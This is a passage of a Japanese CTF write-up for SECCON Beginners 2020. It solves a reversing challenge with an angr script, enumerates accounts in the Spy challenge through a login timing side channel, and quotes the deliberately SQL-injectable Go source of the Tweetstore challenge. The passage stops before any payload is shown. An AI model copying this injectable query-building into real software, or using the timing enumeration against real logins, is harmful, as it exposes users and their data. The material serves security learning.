+(Hint: You&#39;d better automate your analysis)
+</code></pre></div><p>問題文に<code> automate your analysis</code>と書かれているので，<a href="https://github.com/angr/angr"><code>angr</code></a>というツールを使って自動で解析してみます。</p>
+<p>上記リンクにサンプルコードが載っています。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> angr
+
+project <span style="color:#f92672">=</span> angr<span style="color:#f92672">.</span>Project(<span style="color:#e6db74">&#34;angr-doc/examples/defcamp_r100/r100&#34;</span>, auto_load_libs<span style="color:#f92672">=</span>False)
+
+<span style="color:#a6e22e">@project.hook</span>(<span style="color:#ae81ff">0x400844</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_flag</span>(state):
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;FLAG SHOULD BE:&#34;</span>, state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>))
+    project<span style="color:#f92672">.</span>terminate_execution()
+
+project<span style="color:#f92672">.</span>execute()
+</code></pre></div><p>必要なのは正解ルートのアドレス（例では<code>0x400844</code>）になります。</p>
+<p>IDAで開いて，分岐を見てみます。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/82816769-b1b76e80-9ed6-11ea-9c00-ebcfbbe4697d.PNG" alt="キャプチャ"></p>
+<p><code>Correct!</code>と書いてあるほうが正解でしょう。アドレスは<code>0x6D2</code>でした。（下のほうに表示されます）</p>
+<p>サンプルコードを以下のように修正します。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> angr
+
+project <span style="color:#f92672">=</span> angr<span style="color:#f92672">.</span>Project(<span style="color:#e6db74">&#39;./yakisoba&#39;</span>, main_opts<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;base_addr&#39;</span>: <span style="color:#ae81ff">0x0</span>})
+
+<span style="color:#a6e22e">@project.hook</span>(<span style="color:#ae81ff">0x6d2</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_flag</span>(state):
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;FLAG SHOULD BE:&#34;</span>, state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>))
+    project<span style="color:#f92672">.</span>terminate_execution()
+
+project<span style="color:#f92672">.</span>execute()
+</code></pre></div><p>10秒くらいで解けました！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>angr<span style="color:#f92672">)</span> kali@kali:~/ctf/ctf4b-2020/rev/yakisoba$ python3 yaki_solve.py 
+WARNING | 2020-05-25 20:44:46,546 | angr.state_plugins.symbolic_memory | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.
+WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:
+WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | 1<span style="color:#f92672">)</span> setting a value to the initial state
+WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | 2<span style="color:#f92672">)</span> adding the state option ZERO_FILL_UNCONSTRAINED_<span style="color:#f92672">{</span>MEMORY,REGISTERS<span style="color:#f92672">}</span>, to make unknown regions hold null
+WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | 3<span style="color:#f92672">)</span> adding the state option SYMBOL_FILL_UNCONSTRAINED_<span style="color:#f92672">{</span>MEMORY_REGISTERS<span style="color:#f92672">}</span>, to suppress these messages.
+WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | Filling memory at 0x7fffffffffefff8 with <span style="color:#ae81ff">8</span> unconstrained bytes referenced from 0x109d03d <span style="color:#f92672">(</span>explicit_bzero+0x8c6d in libc.so.6 <span style="color:#f92672">(</span>0x9d03d<span style="color:#f92672">))</span>
+FLAG SHOULD BE: b<span style="color:#e6db74">&#39;ctf4b{sp4gh3tt1_r1pp3r1n0}\x00\xd9\xd9\xd9\xd9&#39;</span>
+</code></pre></div><p><code>ctf4b{sp4gh3tt1_r1pp3r1n0}</code></p>
+<h1 id="web">Web</h1>
+<h2 id="spy-web-55-pts-441-solves">Spy (Web, 55 pts, 441 solves)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">As a spy, you are spying on the &#34;ctf4b company&#34;.
+
+You got the name-list of employees and the URL to the in-house web tool used by some of them.
+
+Your task is to enumerate the employees who use this tool in order to make it available for social engineering.
+</code></pre></div><p>指定されたURIにアクセスすると，ログイン画面が確認できます。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/82816791-c136b780-9ed6-11ea-9126-aa002410b180.PNG" alt="キャプチャ3"></p>
+<p>特徴として，下のほうに時間が表示されています。</p>
+<p>また，<code>challenge page</code>にアクセスすると，名前の一覧が表示されます。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/82816810-c98ef280-9ed6-11ea-88b1-42c0661d2e16.PNG" alt="キャプチャ4"></p>
+<p>ここから正しい組み合わせを選択すれば，フラグが出てきそうです。</p>
+<p>次に，配布されたソースコードを見ていきます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> time
+
+<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template, request, session
+
+<span style="color:#75715e"># Database and Authentication libraries (you can&#39;t see this :p).</span>
+<span style="color:#f92672">import</span> db
+<span style="color:#f92672">import</span> auth
+
+<span style="color:#75715e"># ====================</span>
+
+app <span style="color:#f92672">=</span> Flask(__name__)
+app<span style="color:#f92672">.</span>SALT <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CTF4B_SALT&#34;</span>)
+app<span style="color:#f92672">.</span>FLAG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CTF4B_FLAG&#34;</span>)
+app<span style="color:#f92672">.</span>SECRET_KEY <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CTF4B_SECRET_KEY&#34;</span>)
+
+db<span style="color:#f92672">.</span>init()
+employees <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>get_all_employees()
+
+<span style="color:#75715e"># ====================</span>
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    t <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>perf_counter()
+
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span>:
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Please login.&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+    
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+        name <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;name&#34;</span>]
+        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;password&#34;</span>]
+
+        exists, account <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>get_account(name)
+
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> exists:
+            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login failed, try again.&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+
+        <span style="color:#75715e"># auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.</span>
+        <span style="color:#75715e"># You know, it&#39;s really secure... isn&#39;t it? :-)</span>
+        hashed_password <span style="color:#f92672">=</span> auth<span style="color:#f92672">.</span>calc_password_hash(app<span style="color:#f92672">.</span>SALT, password)
+        <span style="color:#66d9ef">if</span> hashed_password <span style="color:#f92672">!=</span> account<span style="color:#f92672">.</span>password:
+            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login failed, try again.&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+
+        session[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">=</span> name
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;dashboard.html&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+
+<span style="color:#75715e"># ====================</span>
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/challenge&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">challenge</span>():
+    t <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>perf_counter()
+    
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span>:
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;challenge.html&#34;</span>, employees<span style="color:#f92672">=</span>employees, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+        answer <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>getlist(<span style="color:#e6db74">&#34;answer&#34;</span>)
+
+        <span style="color:#75715e"># If you can enumerate all accounts, I&#39;ll give you FLAG!</span>
+        <span style="color:#66d9ef">if</span> set(answer) <span style="color:#f92672">==</span> set(account<span style="color:#f92672">.</span>name <span style="color:#66d9ef">for</span> account <span style="color:#f92672">in</span> db<span style="color:#f92672">.</span>get_all_accounts()):
+            message <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>FLAG
+        <span style="color:#66d9ef">else</span>:
+            message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Wrong!!&#34;</span>
+        
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;challenge.html&#34;</span>, message<span style="color:#f92672">=</span>message, employees<span style="color:#f92672">=</span>employees, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+
+<span style="color:#75715e"># ====================</span>
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    db<span style="color:#f92672">.</span>init()
+    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CTF4B_HOST&#34;</span>), port<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CTF4B_PORT&#34;</span>))
+</code></pre></div><p>気になるコメントが書かれています。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> exists:
+            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login failed, try again.&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+        <span style="color:#75715e"># auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.</span>
+        <span style="color:#75715e"># You know, it&#39;s really secure... isn&#39;t it? :-)</span>
+</code></pre></div><p>たくさんストレッチングをおこなっているようです。
+この処理はログインに使用したユーザ名が存在した場合のみおこなわれます。</p>
+<p>ストレッチングを何回やっているかはわかりませんが，この処理にはある程度時間がかかりそうです。</p>
+<p>配布されているユーザリストの先頭からログインしていき，時間をくらべると，時間がかかるグループとかからないグループがあることがわかりました。</p>
+<p>時間がかかったユーザ = 登録されているユーザなので，該当ユーザのみ選択して<code>Answer</code>ボタンを押すと，フラグが得られました！</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/82816845-d7dd0e80-9ed6-11ea-9ed1-ca1f470bee6d.PNG" alt="キャプチャ2"></p>
+<p><code>ctf4b{4cc0un7_3num3r4710n_by_51d3_ch4nn3l_4774ck}</code></p>
+<h2 id="tweetstore-web-150-pts-150-solves">Tweetstore (Web, 150 pts, 150 solves)</h2>
+<pre><code>Search your flag!
+</code></pre><p>指定されたURIにアクセスすると，ツイートの検索画面が確認できます。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/82816860-e0354980-9ed6-11ea-991e-c3383b034108.PNG" alt="キャプチャ5"></p>
+<p>ソースコードも見てみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+
+<span style="color:#f92672">import</span> (
+	<span style="color:#e6db74">&#34;context&#34;</span>
+	<span style="color:#e6db74">&#34;fmt&#34;</span>
+	<span style="color:#e6db74">&#34;log&#34;</span>
+	<span style="color:#e6db74">&#34;os&#34;</span>
+	<span style="color:#e6db74">&#34;strings&#34;</span>
+	<span style="color:#e6db74">&#34;time&#34;</span>
+	
+	<span style="color:#e6db74">&#34;database/sql&#34;</span>
+	<span style="color:#e6db74">&#34;html/template&#34;</span>
+	<span style="color:#e6db74">&#34;net/http&#34;</span>
+
+	<span style="color:#e6db74">&#34;github.com/gorilla/handlers&#34;</span>
+	<span style="color:#e6db74">&#34;github.com/gorilla/mux&#34;</span>
+
+	<span style="color:#a6e22e">_</span><span style="color:#e6db74">&#34;github.com/lib/pq&#34;</span>
+)
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tmplPath</span> = <span style="color:#e6db74">&#34;./templates/&#34;</span>
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">db</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">sql</span>.<span style="color:#a6e22e">DB</span>
+
+<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Tweets</span> <span style="color:#66d9ef">struct</span> {
+	<span style="color:#a6e22e">Url</span>        <span style="color:#66d9ef">string</span>
+	<span style="color:#a6e22e">Text</span>       <span style="color:#66d9ef">string</span>
+	<span style="color:#a6e22e">Tweeted_at</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Time</span>
+}
+
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handler_index</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
+
+	<span style="color:#a6e22e">tmpl</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">template</span>.<span style="color:#a6e22e">ParseFiles</span>(<span style="color:#a6e22e">tmplPath</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;index.html&#34;</span>)
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+	}
+
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sql</span> = <span style="color:#e6db74">&#34;select url, text, tweeted_at from tweets&#34;</span>
+
+	<span style="color:#a6e22e">search</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">Query</span>()[<span style="color:#e6db74">&#34;search&#34;</span>]
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ok</span> {
+		<span style="color:#a6e22e">sql</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; where text like &#39;%&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Replace</span>(<span style="color:#a6e22e">search</span>[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;\\&#39;&#34;</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%&#39;&#34;</span>
+	}
+
+	<span style="color:#a6e22e">sql</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; order by tweeted_at desc&#34;</span>
+
+	<span style="color:#a6e22e">limit</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">Query</span>()[<span style="color:#e6db74">&#34;limit&#34;</span>]
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ok</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">limit</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>) {
+		<span style="color:#a6e22e">sql</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; limit &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">limit</span>[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;;&#34;</span>)[<span style="color:#ae81ff">0</span>]
+	}
+
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data</span> []<span style="color:#a6e22e">Tweets</span>
+
+
+	<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">cancel</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">WithTimeout</span>(<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Background</span>(), <span style="color:#ae81ff">1</span><span style="color:#f92672">*</span><span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span>)
+	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">cancel</span>()
+
+	<span style="color:#a6e22e">rows</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">QueryContext</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">sql</span>)
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span>{
+		<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusText</span>(<span style="color:#ae81ff">500</span>), <span style="color:#ae81ff">500</span>)
+		<span style="color:#66d9ef">return</span>
+	}
+
+	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">rows</span>.<span style="color:#a6e22e">Next</span>() {
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">text</span> <span style="color:#66d9ef">string</span>
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#66d9ef">string</span>
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tweeted_at</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Time</span>
+
+		<span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rows</span>.<span style="color:#a6e22e">Scan</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">url</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">text</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">tweeted_at</span>)
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+			<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusText</span>(<span style="color:#ae81ff">500</span>), <span style="color:#ae81ff">500</span>)
+			<span style="color:#66d9ef">return</span>
+		}
+		<span style="color:#a6e22e">data</span> = append(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">Tweets</span>{<span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">text</span>, <span style="color:#a6e22e">tweeted_at</span>})
+	}
+
+	<span style="color:#a6e22e">tmpl</span>.<span style="color:#a6e22e">Execute</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">data</span>)
+}
+
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">initialize</span>() {
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>
+
+	<span style="color:#a6e22e">dbname</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;ctf&#34;</span>
+	<span style="color:#a6e22e">dbuser</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Getenv</span>(<span style="color:#e6db74">&#34;FLAG&#34;</span>)
+	<span style="color:#a6e22e">dbpass</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;password&#34;</span>
+
+	<span style="color:#a6e22e">connInfo</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;port=%d host=%s user=%s password=%s dbname=%s sslmode=disable&#34;</span>, <span style="color:#ae81ff">5432</span>, <span style="color:#e6db74">&#34;db&#34;</span>, <span style="color:#a6e22e">dbuser</span>, <span style="color:#a6e22e">dbpass</span>, <span style="color:#a6e22e">dbname</span>)
+	<span style="color:#a6e22e">db</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">sql</span>.<span style="color:#a6e22e">Open</span>(<span style="color:#e6db74">&#34;postgres&#34;</span>, <span style="color:#a6e22e">connInfo</span>)
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+	}
+}
+
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+
+	<span style="color:#a6e22e">initialize</span>()
+
+	<span style="color:#a6e22e">r</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">mux</span>.<span style="color:#a6e22e">NewRouter</span>()
+	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#a6e22e">handler_index</span>).<span style="color:#a6e22e">Methods</span>(<span style="color:#e6db74">&#34;GET&#34;</span>)
+
+	<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Handle</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#a6e22e">r</span>)
+	<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ListenAndServe</span>(<span style="color:#e6db74">&#34;:8080&#34;</span>, <span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">LoggingHandler</span>(<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdout</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">DefaultServeMux</span>))
+}
+</code></pre></div><p>少し長いので，重要な箇所をぬきだします。</p>
+<p>SQL文の組み立て処理</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sql</span> = <span style="color:#e6db74">&#34;select url, text, tweeted_at from tweets&#34;</span>
+
+	<span style="color:#a6e22e">search</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">Query</span>()[<span style="color:#e6db74">&#34;search&#34;</span>]
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ok</span> {
+		<span style="color:#a6e22e">sql</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; where text like &#39;%&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Replace</span>(<span style="color:#a6e22e">search</span>[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;\\&#39;&#34;</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%&#39;&#34;</span>
+	}
+
+	<span style="color:#a6e22e">sql</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; order by tweeted_at desc&#34;</span>
+
+	<span style="color:#a6e22e">limit</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">Query</span>()[<span style="color:#e6db74">&#34;limit&#34;</span>]
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ok</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">limit</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>) {
+		<span style="color:#a6e22e">sql</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; limit &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">limit</span>[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;;&#34;</span>)[<span style="color:#ae81ff">0</span>]
+	}
+</code></pre></div><p>データベースの設定処理</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">initialize</span>() {
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>
+
+	<span style="color:#a6e22e">dbname</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;ctf&#34;</span>
+	<span style="color:#a6e22e">dbuser</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Getenv</span>(<span style="color:#e6db74">&#34;FLAG&#34;</span>)
+	<span style="color:#a6e22e">dbpass</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;password&#34;</span>
+
+	<span style="color:#a6e22e">connInfo</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;port=%d host=%s user=%s password=%s dbname=%s sslmode=disable&#34;</span>, <span style="color:#ae81ff">5432</span>, <span style="color:#e6db74">&#34;db&#34;</span>, <span style="color:#a6e22e">dbuser</span>, <span style="color:#a6e22e">dbpass</span>, <span style="color:#a6e22e">dbname</span>)
+	<span style="color:#a6e22e">db</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">sql</span>.<span style="color:#a6e22e">Open</span>(<span style="color:#e6db74">&#34;postgres&#34;</span>, <span style="color:#a6e22e">connInfo</span>)
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+	}
+}
